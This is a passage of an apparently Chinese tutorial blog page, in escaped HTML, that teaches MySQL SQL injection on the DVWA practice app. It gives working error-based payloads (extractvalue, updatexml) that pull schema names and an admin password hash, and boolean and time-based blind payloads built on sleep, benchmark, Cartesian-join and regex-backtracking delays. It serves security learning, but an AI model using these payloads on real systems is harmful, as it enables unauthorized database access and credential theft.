&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; and extractvalue(1,concat(0x7e,database(),0x7e)) #
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; and updatexml(1,concat(0x7e,database(),0x7e),1) #
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;出现下面报错：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;XPATH syntax error: &amp;#39;~dvwa~&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这就得到了数据库的名称：dvwa&lt;/p&gt;
&lt;p&gt;可能你会有疑惑，为什么要用&lt;code&gt;~&lt;/code&gt;包裹内容呢？&lt;/p&gt;
&lt;p&gt;这一方面是方便我们看返回的结果，另一方面嘛，我们接着往下看&lt;/p&gt;
&lt;h3 id=&#34;爆破表名&#34;&gt;爆破表名
&lt;/h3&gt;&lt;p&gt;由于 extractvalue() 最大返回长度为 32 ，所以最好用 limit N,1 一行一行的进行回显&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&amp;#39;dvwa&amp;#39; limit 0,1),0x7e)) #
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&amp;#39;dvwa&amp;#39; limit 1,1),0x7e)) #
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;分别出现下面报错：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;XPATH syntax error: &amp;#39;~guestbook~&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;XPATH syntax error: &amp;#39;~users~&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;而如果不用limit语句，则会出现下面的报错：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Subquery returns more than 1 row
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;这不是我们想要的，所以limit语句很重要！&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;爆破列名&#34;&gt;爆破列名
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&amp;#39;users&amp;#39; limit 3,1),0x7e)) #
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&amp;#39;users&amp;#39; limit 4,1),0x7e)) #
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;分别出现下面报错：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;XPATH syntax error: &amp;#39;~user~&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;XPATH syntax error: &amp;#39;~password~&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;爆破字段内容&#34;&gt;爆破字段内容
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; and extractvalue(1,concat(0x7e,(select concat_ws(&amp;#39;,&amp;#39;,user,password) from users limit 0,1),0x7e)) #
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;出现下面的报错：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;XPATH syntax error: &amp;#39;~admin,5f4dcc3b5aa765d61d8327deb&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这里我们使用了&lt;code&gt;concat_ws&lt;/code&gt;函数，指定把&lt;code&gt;user&lt;/code&gt;和&lt;code&gt;password&lt;/code&gt;字段使用&lt;code&gt;,&lt;/code&gt;拼接再返回，这样就能实现查询多列&lt;/p&gt;
&lt;p&gt;如果不使用，就会出现下面的报错：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Operand should contain 1 column(s)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然而，正如上面所说，&lt;code&gt;extractvalue()&lt;/code&gt; 函数最大返回32个字符，所以现在得到的并非完整的信息，这一点我们也能从结果末尾没有&lt;code&gt;~&lt;/code&gt;看出来**（所以两边都加&lt;code&gt;~&lt;/code&gt;是比较明智的选择）**&lt;/p&gt;
&lt;p&gt;所以，我们要适当舍弃一些东西，比如把admin单独拿出来，或者使用**&lt;code&gt;substring()&lt;/code&gt;函数**&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;substring(strings,m,n)&lt;/code&gt;：从strings的第m个字符开始，向后截取n个字符。&lt;/strong&gt;
&lt;strong&gt;&lt;mark&gt;注意&lt;/mark&gt;：1.&lt;code&gt;substring()&lt;/code&gt;的开始位置为1，和&lt;code&gt;limit&lt;/code&gt;不一样！&lt;/strong&gt;
&lt;strong&gt;2.通常&lt;code&gt;substr()&lt;/code&gt;可以代替它，用法也相同；而&lt;code&gt;mid()&lt;/code&gt;总是可以代替它，因为就是它的别名&lt;/strong&gt;
&lt;strong&gt;&lt;mark&gt;substr()=substring()=mid()&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;&lt;/blockquote&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; and extractvalue(1,concat(0x7e,(select substring(concat_ws(&amp;#39;,&amp;#39;,user,password), 1, 30) from users limit 0,1),0x7e)) #
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; and extractvalue(1,concat(0x7e,(select substring(concat_ws(&amp;#39;,&amp;#39;,user,password), 31, 30) from users limit 0,1),0x7e)) #
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;分别得到下面的报错：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;XPATH syntax error: &amp;#39;~admin,5f4dcc3b5aa765d61d8327de~&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;XPATH syntax error: &amp;#39;~b882cf99~&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;拼接得到完整的用户名和密码：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;admin,5f4dcc3b5aa765d61d8327deb882cf99
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;利用&lt;code&gt;substring()&lt;/code&gt;，即使字段长度远远大于32，我们也能一点点凑出完整的内容&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;3-盲注&#34;&gt;#3 盲注
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;有的时候存在注入点，但是前端并不会回显注入结果，这就需要用特殊方式判断我们是否注入成功&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;常用函数-2&#34;&gt;常用函数
&lt;/h3&gt;&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th style=&#34;text-align: center&#34;&gt;函数&lt;/th&gt;
          &lt;th style=&#34;text-align: center&#34;&gt;用法&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;mid/substr/substring(string, m, n)&lt;/td&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;从 m 位置截取string字符串 n 位，初始位置为1，n 可省略&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;length(string)&lt;/td&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;返回字符串长度&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;ord(string)&lt;/td&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;返回 string 最左面字符的 ASCII 码值&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;left(string, len)&lt;/td&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;从左截取 string 的前 len 位&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;ascii()&lt;/td&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;将某个字符转换为 ASCII 码值&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;if(exp1, exp2, exp3)&lt;/td&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;如果 exp1 正确，就执行 exp2 ，否则执行 exp3&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;sleep(time)&lt;/td&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;休眠多少秒&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;布尔盲注&#34;&gt;布尔盲注
&lt;/h3&gt;&lt;p&gt;当我们查询的数据在数据库存在时，就会返回：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;User ID exists in the database
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;反之，则会返回：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;User ID is MISSING from the database
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;我们可以构造一些判别式，观察页面返回值，来判断输入的语句是否为真&lt;/p&gt;
&lt;h4 id=&#34;猜测长度&#34;&gt;猜测长度
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;使用与(and)：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; and length(database())=4 #
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;使用或(or)：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;#39; or length(database())=4 #
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;页面返回exists，说明数据库名称长度为4&lt;/p&gt;
&lt;p&gt;如果库名实在长，也可以使用&lt;strong&gt;二分法&lt;/strong&gt;：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; and length(database())&amp;gt;4 #
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;猜测库名&#34;&gt;猜测库名
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; and substring(database(),1,1)=&amp;#39;d&amp;#39; #
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;如果不想使用&lt;code&gt;&#39;&#39;&lt;/code&gt;包裹字母，也可以转换成ascii码：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; and ascii(substr(database(),1,1))=100 #
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;一步步尝试，直到尝试出完整的数据库名称&lt;/p&gt;
&lt;p&gt;当然，我们在知道ascii码表的情况下，使用二分法更快：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; and ascii(substr(database(),1,1))&amp;gt;64 #
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;如果substring被过滤了：&lt;a class=&#34;link&#34; href=&#34;#reverse&amp;#43;left%e4%bb%a3%e6%9b%bfsubstring&#34; &gt;reverse+left代替substring
    
&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;​				       &lt;a class=&#34;link&#34; href=&#34;#trim%e4%bb%a3%e6%9b%bfsubstring&#34; &gt;trim代替substring
    
&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;附上一张ascii码表：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/ascii-1-1.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;ASCII 表| 菜鸟教程&#34;
	
	
&gt;&lt;/p&gt;
&lt;h4 id=&#34;猜测表的数量&#34;&gt;猜测表的数量
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; and (select count(table_name) from information_schema.tables where table_schema=&amp;#39;dvwa&amp;#39;)=2 #
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;猜测表2的长度&#34;&gt;猜测表2的长度
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; and length((select table_name from information_schema.tables where table_schema=&amp;#39;dvwa&amp;#39; limit 1,1))=5#
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;或者把length放在select后面：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; and (select length(table_name) from information_schema.tables where table_schema=&amp;#39;dvwa&amp;#39; limit 1,1)=5#
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;span style=&#34;color:red;font-size:20px&#34;&gt;&lt;strong&gt;猜测表名，字段名等等的步骤都大同小异，在此不过多赘述&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;时间盲注&#34;&gt;时间盲注
&lt;/h3&gt;&lt;p&gt;如果页面连exists这样的返回字样都没有怎么办？&lt;/p&gt;
&lt;p&gt;那么，我们就要寻找新的特征，来指示我们语句成功执行了——那就是时间&lt;/p&gt;
&lt;h4 id=&#34;sleep延时&#34;&gt;sleep延时
&lt;/h4&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;利用if函数和sleep函数，如果语句成功执行，就让页面延时一段时间：&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; and if(length(database())=4,sleep(5),1)#
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;注意此处if函数有三个参数，最后一个失败执行的语句exp3不能为空，要填上1补空&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;如果不用if，也是可以的：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; and sleep((ascii(substring(database(),1,1))=100)*5)#
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;页面休眠了五秒，说明语句执行成功（sleep()返回了1,1*5=5），数据库名称长为4&lt;/p&gt;
&lt;p&gt;如果if函数被过滤了：[case when语句代替if](#case when语句代替if)&lt;/p&gt;
&lt;h4 id=&#34;benchmark延时&#34;&gt;benchmark延时
&lt;/h4&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;benchmark(count, exp)：将表达式exp重复执行count次&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;只要我们让执行次数够多，就能达到和sleep一样的延迟效果：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; and if(ascii(substring(database(),1,1))=100,benchmark(5000000,md5(&amp;#39;a&amp;#39;)),1)#
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;如果数据库第一个字符是d，就让数据库计算五百万次a的md5值，这个过程近似五秒&lt;/p&gt;
&lt;h4 id=&#34;笛卡尔积延时&#34;&gt;笛卡尔积延时
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;当查询发生在多个表中，并且没有任何限制条件时，会将多个表已笛卡尔积的形式联合起来：&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; and if(ascii(substring(database(),1,1))=100, (SELECT count(*) FROM information_schema.columns A, information_schema.columns B), 1)#
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这个查询将&lt;code&gt;information_schema.columns&lt;/code&gt;这张表自身进行了两次连接，查询起来很费时（大概要两三秒）&lt;/p&gt;
&lt;p&gt;如果感觉延时不够明显，可以多加几次自连接&lt;/p&gt;
&lt;h4 id=&#34;正则匹配延时&#34;&gt;正则匹配延时
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;通过构造正则表达式，让数据库的正则引擎在进行匹配时陷入大量的回溯计算，从而消耗极长的CPU时间：&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; and if(ascii(substring(database(),1,1))=100, (select rpad(&amp;#39;a&amp;#39;,9999999,&amp;#39;a&amp;#39;) RLIKE concat(repeat(&amp;#39;(a.*)+&amp;#39;,30),&amp;#39;b&amp;#39;)), 1)#
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;我们来看看其中的正则延时部分是怎么工作的：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;select rpad(&amp;#39;a&amp;#39;,4999999,&amp;#39;a&amp;#39;) RLIKE concat(repeat(&amp;#39;(a.*)+&amp;#39;,30),&amp;#39;b&amp;#39;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;rpad(str,len,padstr)&lt;/code&gt;：用字符串&lt;code&gt;padstr&lt;/code&gt;对&lt;code&gt;str&lt;/code&gt;进行右边填补，直至它的长度达到&lt;code&gt;len&lt;/code&gt;，然后返回 &lt;code&gt;str&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;​			         &lt;strong&gt;如果&lt;code&gt;str&lt;/code&gt;的长度长于&lt;code&gt;len&lt;/code&gt;，那么它将被截除到&lt;code&gt;len&lt;/code&gt;个字符&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;(a.*)+&lt;/code&gt;：内部的 &lt;code&gt;.*&lt;/code&gt; 和外部的 &lt;code&gt;+&lt;/code&gt; 都是贪婪量词，当正则引擎用这个模式去匹配一个长字符串时，存在指数级的可能性来划分字符串（例如，&lt;code&gt;(a)(a)(a)&lt;/code&gt;、&lt;code&gt;(aa)(a)&lt;/code&gt;、&lt;code&gt;(a)(aa)&lt;/code&gt;等），引擎需要尝试所有这些路径&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
